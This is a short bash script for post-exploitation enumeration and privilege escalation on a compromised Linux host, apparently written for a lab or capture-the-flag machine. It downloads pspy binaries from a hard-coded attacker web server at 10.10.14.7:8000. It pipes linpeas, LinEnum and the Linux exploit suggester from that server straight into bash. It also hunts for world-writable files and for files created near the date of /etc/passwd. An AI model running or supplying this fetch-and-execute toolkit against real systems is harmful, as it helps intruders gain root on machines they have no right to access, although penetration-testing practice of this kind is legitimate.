#!/bin/bash

function echo_color
{
    declare FG_COLOR_CYAN="$(tput setaf 6)"
    declare arg="$@"    
    echo "${FG_COLOR_CYAN}${arg}${FG_COLOR_RESET}"
}

function exec_wrapper
{
    local cmd="$@"
    echo
    echo
    echo_color "-----------------------------------------------------------------------------------------"
    echo_color "          [*] running: '$cmd'"    
    echo_color "-----------------------------------------------------------------------------------------"
    echo
    echo
    eval "$cmd"
}

echo "[*] running single enumeration / privesc script"

declare ip_addr="10.10.14.7"
declare webserver_port=8000
#declare results_dir="/tmp/results-$$"

# create temporary directory
#exec_wrapper mkdir -p \"${results_dir}\"; cd \"${results_dir}\"
results_dir="."


# wget pspy64
exec_wrapper "wget -q http://${ip_addr}:${webserver_port}/pspy64; chmod +x ./pspy64"

# wget pspy32
exec_wrapper "wget -q http://${ip_addr}:${webserver_port}/pspy32; chmod +x ./pspy32"

# find world writable files/dirs
exec_wrapper "find / \( -type f -o -type d \) -perm -o+w -ls 2>/dev/null | grep -v '/proc/' > \"${results_dir}\"/world-writable.txt &"

# get datetime of /etc/passwd and run forensics
# find files in +/- date/time of when /etc/passwd was created
declare passwd_create_date=$(stat /etc/passwd | grep Birth | awk '{print $2}')
declare start_date=$(date +%Y-%m-%d -d "${passwd_create_date} - 3 day")
declare end_date=$(date +%Y-%m-%d -d "${passwd_create_date} + 3 day")


declare scan_cmd="find / \( -type f -o -type d \) -newermt '${start_date}' ! -newermt '${end_date}'  -ls 2>/dev/null | grep -v '/proc/\|/sys/\|/dev/\|/run/'"
declare scan_logfile="${results_dir}/newermt-${start_date}_${end_date}.scan.txt"
echo "[*] cmd: '${scan_cmd}'" > "${scan_logfile}"
echo "" >> "${scan_logfile}"
echo "" >> "${scan_logfile}"
exec_wrapper "${scan_cmd} >> \"${scan_logfile}\" &"

# run linpeas 
exec_wrapper "wget -q -O - http://${ip_addr}:${webserver_port}/linpeas.sh | bash"

# run LinEnum
exec_wrapper "wget -q -O - http://${ip_addr}:${webserver_port}/LinEnum.sh | bash"

# run linux exploit suggester
exec_wrapper "wget -q -O - http://${ip_addr}:${webserver_port}/les.sh | bash"

